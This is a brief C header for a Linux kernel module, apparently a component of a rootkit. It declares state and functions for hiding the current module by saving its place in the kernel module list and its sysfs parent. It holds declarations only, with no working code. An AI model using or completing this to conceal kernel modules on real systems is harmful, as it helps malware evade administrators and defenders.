#ifndef MODULE_HIDER_H
#define MODULE_HIDER_H

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kobject.h>
#include <linux/slab.h>
#include <linux/types.h>
#include <linux/list.h>

struct module_hider_state {
    struct list_head *saved_list_pos;
    struct kobject   *saved_parent;
    bool hidden;
};

void module_hide_current(void);

bool module_is_hidden(void);

#endif
